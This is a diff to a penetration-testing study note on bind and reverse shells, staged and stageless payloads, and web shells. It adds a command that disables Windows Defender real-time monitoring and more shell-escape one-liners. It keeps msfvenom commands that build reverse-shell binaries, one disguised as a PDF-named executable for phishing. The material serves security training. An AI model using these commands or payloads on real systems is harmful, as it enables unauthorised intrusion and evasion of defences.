@@ -3,10 +3,10 @@ tags: [basics, technique, shell, payload]
 ---
 
 
-> [!info] See also: [[Certifications/CPTS/Shell & Payloads|Shell & Payloads (CPTS — detailed)]] · [[Reverse Shell]] · [[Metasploit]]
+> [!info] See also: [[Reverse Shell]] · [[Metasploit]]
 
 
-## General concepts 
+## General Concepts 
 
 ### Bind Shell 
 With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box)
@@ -40,6 +40,14 @@ sudo nc -lvnp 443
 ```
 
 
+## Disabling Windows Defender (smash and grab)
+
+```powershell
+# Requires admin
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+
 ## Staged vs. Stageless Payloads 
 
 **Staged**
@@ -59,6 +67,9 @@ windows/meterpreter_reverse_tcp
 
 You can see that the "/" is used to separate stages. And With the staged payload you have a separation between the network and the payload.
 
+[Deep Dive Into Stageless Meterpreter Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
+
+
 ## Crafting Payloads with MSFvenom
 
 With MSFvenom we are able to generate payload which we could for example distribute via phishing etc. So no direct network connectivity is required! 
@@ -67,54 +78,71 @@ With MSFvenom we are able to generate payload which we could for example distrib
 # List possible payloads 
 msfvenom -l payloads 
 
-# Building a stageless payload 
+# Building a stageless payload (Linux)
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ipaddress> LPORT=<port> -f elf > createbackup.elf
 
 # Building a stageless payload for a windows system 
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > BonusCompensationplanpdf.exe
-
 ```
 
 
 ## Infiltrating Windows 
 
-When trying to infiltrate windows the following payload Types are interessting: 
+Enumerating Windows:
+- Windows hosts can be identified by the TTL — commonly 32 or 128
+- Banner grabbing can be done with the `banner.nse` Nmap script
+
+Payload types to consider:
 - DLLs
 - Batch
 - VBS
 - MSI
 - Powershell
 
-Tools for Payload Generation are: 
+Tools for Payload Generation:
 - MSFVenom & Metasploit Framework
-- Payload All the Things 
+- Payloads All The Things
 - Mythic C2 Framework
 - Nishang
 - Darkarmour
 
 Payload Transfer and Execution:
 - Impacket
-- Payload All the things 
+- Payloads All The Things 
 - SMB
 
 
 ## Infiltrating NIX Shells 
 
-Spawning interactive shells 
+Spawning interactive shells:
 ```bash 
 # TTY shell using python
 python -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # bash interactive shell 
 /bin/sh -i 
 
-# Perl Shell 
+# Perl
 perl -e 'exec "/bin/sh";'
 
-# Vim to Shell 
-vim -c ':!/bin/sh'
+# Ruby 
+ruby -e 'exec "/bin/sh"'
 
+# Lua 
+lua -e 'os.execute("/bin/sh")'
+
+# AWK
+awk 'BEGIN {system("/bin/sh")}'
+
+# Find 
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+find . -exec /bin/sh \; -quit
+
+# Vim
+vim -c ':!/bin/sh'
 ```
+
 
 ## Infiltrating Web Shells 
 A web shell is a browser-based shell session we can use to interact with the underlying operating system of a web server.
@@ -124,9 +152,8 @@ You can use ready made Web Shells from [Laudanum](https://github.com/jbarcia/Web
 Workflow would be to copy away the shell you need from `/usr/share/laudanum` and then modify it so that it can connect back to you.
 
 
-
 ## Links 
 
-- [Reverse Shell Cheat Sheet ](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
-
-
+- [Reverse Shell Cheat Sheet (PayloadsAllTheThings)](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)
+- [Internal All The Things — reverse shells](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
+- [IppSec rocks (video search)](https://ippsec.rocks/?#)
